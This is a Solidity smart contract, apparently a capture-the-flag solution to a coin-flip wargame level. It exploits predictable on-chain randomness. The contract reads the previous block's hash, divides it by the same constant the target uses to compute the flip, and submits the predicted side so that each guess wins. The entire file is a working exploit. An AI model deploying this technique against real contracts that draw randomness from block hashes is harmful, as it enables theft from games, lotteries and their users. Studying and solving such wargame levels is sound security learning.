// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool res);
}

interface IAttack {
    function attack() external;
}

contract MyCoinFlipAttack is IAttack {
    ICoinFlip private _coinFlipInstance;
    uint256 private _lastHash;
    uint256 private constant _FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    event GuessAttempt(address indexed coinFlipContract, bool indexed side, bool indexed result);
    error PleaseWaitNextBlock();

    constructor(address coinFlipAddress) {
        _coinFlipInstance = ICoinFlip(coinFlipAddress);
    }

    function attack() public override {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (_lastHash == blockValue) {
            revert PleaseWaitNextBlock();
        }

        _lastHash = blockValue;
        uint256 coinFlip = blockValue / _FACTOR;
        bool side = coinFlip == 1 ? true : false;

        bool result = _coinFlipInstance.flip(side);
        emit GuessAttempt(address(_coinFlipInstance), side, result);
    }
}
